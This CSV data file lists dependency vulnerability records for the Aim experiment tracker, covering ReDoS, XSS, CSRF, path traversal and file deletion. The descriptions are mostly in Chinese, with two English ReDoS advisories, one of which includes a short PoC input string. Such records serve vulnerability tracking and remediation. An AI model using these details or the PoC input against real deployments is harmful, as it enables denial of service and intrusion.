project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
aimhubio_aim,mistune,0.8.4,True,CVE-2022-34749,CWE-1333,2022-07-05,"mistune是Hsiaoming Yang个人开发者的一个快速而强大的 Python Markdown 解析器。
mistune 2.0.2及以前的版本存在安全漏洞，该漏洞源于其对内联标记的支持是通过使用正则表达式实现的，这可能会在某些边缘情况下涉及大量的回溯。",2,2
aimhubio_aim,sphinx,,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
aimhubio_aim,sphinx,,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
aimhubio_aim,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
aimhubio_aim,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
aimhubio_aim,aim,>=3.0.0,True,CVE-2021-43775,CWE-22,2021-11-23,"Aim是美国的一个易于使用和高性能的开源实验跟踪器。
Aim 3.1.0之前版本存在路径遍历漏洞，攻击者可利用该漏洞通过操纵引用具有点-点斜杠（../）序列及其变体的文件的变量，或通过使用绝对文件路径，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码或配置以及关键系统文件。",1,2
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6578,CWE-79,,Aim 是由 Aim 开源的一个易于使用和高性能的实验跟踪器，允许用户记录、搜索和比较 AI 实验。在 Aim 版本 3.19.3 中，由于在生成网页时对输入的不正确中和，导致出现跨站脚本 (XSS) 漏洞。该漏洞允许攻击者通过在日志中注入恶意脚本进行攻击，用户在查看日志标签时该恶意脚本将被执行。利用 `dangerouslySetInnerHTML` 函数，使得在 React 应用中生成的日志输出容易受到 XSS 攻击。,3,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-7760,CWE-352,,Aim 是美国 Aim 开源的一个易于使用和高性能的开源实验跟踪器。Aim 版本 3.22.0 存在跨站请求伪造（CSRF）漏洞，该漏洞由于过于宽松的 CORS 设置而产生，允许来自所有源的跨源请求。这使得针对跟踪服务器所有端点的 CSRF 攻击成为可能，且可以与其他现存的漏洞（如远程代码执行、拒绝服务和任意文件读写）链式利用。,3,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2025-51464,CWE-79,2025-07-22,Aimhubio Aim 是一个开源工具，专为数据科学和机器学习工程设计，帮助用户管理和跟踪实验、数据和模型。该工具的 3.28.0 版本中存在一个跨站脚本 (XSS) 漏洞。攻击者可以通过向 /api/reports 端点发送恶意的 Python 代码，利用 Pyodide 在查看报告时解释并执行未经过滤的代码，特别是通过 pyodide.code.run_js() 执行 JavaScript，而没有适当的输入校验和沙箱限制。Pyodide 是一个项目，允许在浏览器中运行 Python，通常用于动态数据处理和科学计算。,3,0
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6851,CWE-22,,Aim 是美国 Aim 开源的一个易于使用和高性能的开源实验跟踪器。在 Aim 3.22.0 版本中，LocalFileManager._cleanup 函数接受用户指定的 glob-pattern 来删除文件。该函数未验证匹配的文件是否在 LocalFileManager 管理的目录内，从而允许恶意构造的 glob-pattern 导致任意文件删除。,2,1
